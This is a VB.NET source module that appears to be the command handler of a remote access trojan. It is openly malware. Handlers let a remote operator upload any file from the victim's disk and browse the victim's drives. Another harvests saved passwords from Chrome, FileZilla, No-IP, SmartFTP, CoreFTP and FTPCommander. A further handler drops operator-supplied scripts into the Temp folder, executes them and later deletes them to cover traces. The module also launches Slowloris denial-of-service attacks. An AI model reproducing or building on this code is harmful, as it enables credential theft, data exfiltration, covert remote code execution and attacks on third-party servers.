Option Strict Off
Imports System.Windows.Forms
Imports System.Threading
Imports System.IO
Imports System.Text
Imports Microsoft.VisualBasic
Imports System.Net


Module MiscCommandHandler

    Dim Extension As String
    Dim SplitCommand() As String
    Dim ScriptText As String
    Dim SplitFilesUsed() As String
    Dim FilesUsed As String = ""
    Dim FilesCount As Integer

    Public Sub HandleMiscCommand(params As Object())

        Select Case DirectCast(params(1), MiscCommand)
            Case MiscCommand.Script
                HandleMiscCommandScript((params))
            Case MiscCommand.Recover
                HandleMiscCommandRecover((params))
            Case MiscCommand.Manage
                HandleMiscCommandManage((params))
            Case MiscCommand.Upload
                HandleMiscCommandUpload((params))
        End Select

    End Sub

    Public Sub HandlecomSST(params As Object())

        Select Case DirectCast(params(1), SSTType)
            Case SSTType.Slowloris
                HandleSSTSlowloris((params))
        End Select

    End Sub


#Region " Senders "

    Public Sub SendMiscCommandScript(Message As String)
        SendCommand(CommandType.MiscCommand, MiscCommand.Script, Message)
    End Sub
    Public Sub SendMiscCommandRecover(Message As String)
        SendCommand(CommandType.MiscCommand, MiscCommand.Recover, Message)
    End Sub
    Public Sub SendMiscCommandManage(Message As String)
        SendCommand(CommandType.MiscCommand, MiscCommand.Manage, Message)
    End Sub
    Public Sub SendMiscCommandUpload(Message As String)
        SendCommand(CommandType.MiscCommand, MiscCommand.Upload, Message)
    End Sub
    Public Sub SendMiscCommandSST(Message As String)
        SendCommand(CommandType.MiscCommand, MiscCommand.SST, Message)
    End Sub

    Public Sub UpdateColumn(ColumnName As String, UpdateText As String)
        SendCommand(CommandType.Column, ColumnName, UpdateText)
    End Sub

#End Region


#Region " Handlers "

#Region " MiscCommands "


    Private Sub HandleMiscCommandUpload(params As Object())
        Dim manDir As String = DirectCast(params(2), String)
        Dim SplitTest() As String = Split(manDir, "\")

        SendMiscCommandUpload(System.Convert.ToBase64String(My.Computer.FileSystem.ReadAllBytes(manDir)) & "|" & SplitTest(SplitTest.Length - 1))
    End Sub

    Private Sub HandleMiscCommandManage(params As Object())

        Dim manDir As String = DirectCast(params(2), String)

        If params(2) = "GetDrives" Then

            Dim allDrives() As DriveInfo = DriveInfo.GetDrives()
            For Each d As DriveInfo In allDrives
                SendMiscCommandManage("[Drive]|" & d.Name & "|" & d.Name & "|")
            Next

        Else

            For Each foundFile As String In My.Computer.FileSystem.GetDirectories(manDir)
                Dim FileInfo = My.Computer.FileSystem.GetFileInfo(foundFile)
                SendMiscCommandManage("[Folder]|" & FileInfo.name & "|" & FileInfo.FullName & "| ")
            Next

            For Each foundFile As String In My.Computer.FileSystem.GetFiles(manDir)
                Dim FileInfo = My.Computer.FileSystem.GetFileInfo(foundFile)
                SendMiscCommandManage("[File]|" & FileInfo.Name & "|" & FileInfo.FullName & "|" & FileInfo.Length)
            Next

        End If

    End Sub

    Private Sub HandleMiscCommandRecover(params As Object())
        Try
            Chrome.GetChrome()

            FileZilla.FileZillaRec()

            No_IP.IpRecord()

            SmartFTP.SmartFTP()

            CoreFTP.CoreFTP()

            FTPCommander.FtpCommander()
        Catch ex As Exception
            WriteError(ex, "Recieving passwords")
        End Try
    End Sub

    Private Sub HandleMiscCommandScript(params As Object())
        Dim Message As String = DirectCast(params(2), String)

        SplitCommand = Split(Message, "|")

        ScriptText = SplitCommand(1)
        Try

            If SplitCommand(0).Contains("VBS") Then
                WriteFile(".vbs")
            ElseIf SplitCommand(0).Contains("Batch") Then
                WriteFile(".bat")
            ElseIf SplitCommand(0).Contains("HTML") Then
                WriteFile(".html")
            ElseIf SplitCommand(0).Contains("PY") Then
                WriteFile(".py")
            ElseIf SplitCommand(0).Contains("JS") Then
                WriteFile(".JS")
            ElseIf SplitCommand(0).Contains("PHP") Then
                WriteFile(".PHP")
            ElseIf SplitCommand(0).Contains("REM") Then
                RemoveFiles()
            End If

        Catch ex As Exception
            WriteError(ex, "Processing Command")
        End Try

    End Sub

#End Region

#Region " SST "
    Private Sub HandleSSTSlowloris(params As Object())
        Dim Message As String = DirectCast(params(2), String)
        SplitCommand = Split(Message, "|")
        StartSlowloris(SplitCommand(0), SplitCommand(1), SplitCommand(2), SplitCommand(3))
    End Sub
#End Region

#End Region

#Region "Write File"

    Sub WriteError(Message As Exception, Site As String)
        LoggingHost.LogClientException(Message, Site)
    End Sub

    Sub WriteLog(Message As String)
        LoggingHost.LogClientMessage(Message)
    End Sub

    Sub WriteFile(Extension As String)
        Try
            Dim FILE_NAME As String
            Dim FILE_LOCATION As String
Retry:
            FILE_NAME = Generatecode()
            FILE_LOCATION = "C:\Users\" & Environment.UserName & "\AppData\Local\Temp\" & FILE_NAME & Extension

            If System.IO.File.Exists(FILE_LOCATION) = False Then
                FilesUsed += "|" & FILE_LOCATION
                Dim objWriter As New System.IO.StreamWriter(FILE_LOCATION)
                objWriter.Write(ScriptText)
                objWriter.Close()
            Else
                GoTo Retry
            End If


            Process.Start(FILE_LOCATION)
            SendMiscCommandScript(Environment.MachineName & "/" & Environment.UserName & "|" & FILE_LOCATION & "|" & FILE_NAME & "|" & Extension & "|Executed!")


        Catch ex As Exception
            WriteError(ex, "Executing Command")
        End Try
    End Sub

    Public Sub RemoveFiles()
        Try
            If FilesUsed.Length > 0 Then
                WriteLog("[NanoScript] Cleaning up files...")
                SplitFilesUsed = Split(FilesUsed, "|")
                If SplitFilesUsed.Length + 1 > 0 Then
                    Dim i As Integer
                    For i = 0 To SplitFilesUsed.Length - 1
                        If Not SplitFilesUsed(i) = Nothing Then
                            My.Computer.FileSystem.DeleteFile(SplitFilesUsed(i))
                        End If
                    Next i
                    FilesUsed = ""
                End If
            Else
            End If
        Catch ex As Exception
            WriteError(ex, "Removing files")
        End Try
    End Sub

    Public Function Generatecode()

        Return IO.Path.GetFileNameWithoutExtension(IO.Path.GetRandomFileName())

    End Function

#End Region

End Module
